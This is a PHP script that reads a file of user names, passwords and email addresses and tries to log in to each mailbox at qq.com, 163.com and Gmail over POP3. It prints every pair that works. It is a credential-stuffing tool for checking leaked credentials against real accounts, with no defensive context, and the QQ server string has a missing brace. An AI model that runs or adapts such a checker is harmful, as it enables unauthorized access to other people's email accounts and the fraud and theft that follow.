<?php

$fp = fopen('account.data', 'r');
if($fp == false)
{
	die('cannot open the data file\n');
}

while(($line = fgets($fp)) != false)
{
	$user = explode(' # ', $line);
	
	if(count($user) != 3)
	{
		continue;
	}

	$user_name = $user[0];
	$user_passwd = $user[1];
	$user_email = trim($user[2]);

	if(strstr($user_email, "@qq.com"))
	{
		check_qq_email($user_email, $user_passwd);
	}
	else if(strstr($user_email, "@163.com"))
	{
		check_163_email($user_email, $user_passwd);
	}
	else if(strstr($user_email, "@gmail.com"))
	{
		check_gmail_email($user_email, $user_passwd);
	}

}

fclose($fp);


function check_163_email($user_email, $user_passwd)
{
	$mbox = imap_open("{pop.163.com:110/pop3}INBOX", $user_email, $user_passwd, NULL, 1);
#	$mbox = imap_open("{imap.163.com:993/ssl}INBOX", $user_email, $user_passwd, NULL, 1);
	
	if($mbox)
	{
		echo "Correct: $user_email -> $user_passwd\n";
	}
}

function check_qq_email($user_email, $user_passwd)
{
	$mbox = imap_open("pop.qq.com:110/pop3}INBOX", $user_email, $user_passwd, NULL, 1);
#	$mbox = imap_open("{imap.163.com:993/ssl}INBOX", $user_email, $user_passwd, NULL, 1);
	
	if($mbox)
	{
		echo "Correct: $user_email -> $user_passwd\n";
	}
}

function check_gmail_email($user_email, $user_passwd)
{
	$mbox = imap_open("{pop.gmail.com:995/pop3/ssl}INBOX", $user_email, $user_passwd, NULL, 1);
	#$mbox = imap_open("{imap.gmail.com:993/imap/ssl}INBOX", $user_email, $user_passwd, NULL, 1);
	if($mbox)
	{
		echo "Correct: $user_email -> $user_passwd\n";
	}
}


?>

